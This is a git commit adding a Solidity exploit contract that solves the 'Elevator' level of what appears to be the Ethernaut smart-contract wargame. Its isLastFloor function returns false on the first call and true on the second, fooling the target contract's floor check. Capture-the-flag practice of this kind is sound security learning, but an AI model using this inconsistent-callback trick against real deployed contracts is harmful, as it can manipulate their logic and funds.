2fc7a7363ce693f6468bbce4e8f3d743dc19631c
TimOu <99255480+timou0911@users.noreply.github.com>
2024-03-20 00:37:52 +0800

    Update Attack.sol

--- 11. Elevator ★★☆☆☆/Attack.sol
+++ 11. Elevator ★★☆☆☆/Attack.sol
@@ -1,1 +1,31 @@
+// SPDX-License-Identifeir: MIT
 
+pragma solidity ^0.8.0;
+
+interface Elevator {
+    function goTo(uint _floor) external;
+}
+
+contract Attack {
+
+    Elevator private target;
+    bool isFirstCall = true;
+
+
+    constructor(address targetAddr) {
+        target = Elevator(targetAddr);
+    }
+
+    function attack() public {
+        target.goTo(0);
+    }
+
+    function isLastFloor(uint256 _floor) public returns (bool) {
+        if (isFirstCall) {
+            isFirstCall = false;
+            return false; // the first call should return false
+        } else {
+            return true; // the second call should return true
+        }
+    }
+}
